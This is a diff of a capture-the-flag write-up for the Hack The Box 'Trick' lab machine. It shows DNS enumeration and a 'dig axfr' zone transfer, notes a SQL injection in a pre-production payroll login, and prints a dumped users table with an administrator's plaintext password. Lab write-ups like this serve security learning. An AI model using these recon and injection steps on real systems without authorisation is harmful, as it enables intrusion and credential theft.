@@ -6,9 +6,10 @@
 80 - nginx 1.14.2 - unconfigured boostrap
 ```
 ---
+
 ## DNS Enum
 ```
-(blnkn㉿Kolossus)-[~/sec/htb/machines/trick]─$ nslookup
+nslookup
 > SERVER 10.10.11.166
 Default server: 10.10.11.166
 Address: 10.10.11.166#53
@@ -17,7 +18,7 @@ Address: 10.10.11.166#53
 >
 ```
 ```
-(blnkn㉿Kolossus)-[~/sec/htb/machines/trick]─$ dig axfr @10.10.11.166 trick.htb
+dig axfr @10.10.11.166 trick.htb
 
 ; <<>> DiG 9.18.1-1-Debian <<>> axfr @10.10.11.166 trick.htb
 ; (1 server found)
@@ -34,6 +35,8 @@ trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604
 ;; XFR size: 6 records (messages 1, bytes 231)
 ```
 ---
+
+## SQLi
 <a href="http://preprod-payroll.trick.htb" target="_blank">http://preprod-payroll.trick.htb</a>
 The preprod portal has a login page, which is vulnerable to SQli  
 ![sqli](./sqli.png)
@@ -55,3 +58,4 @@ Table: users
 | 1  | 0         | Administrateur | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
 +----+-----------+----------------+------+---------+---------+-----------------------+------------+
 ```
+---
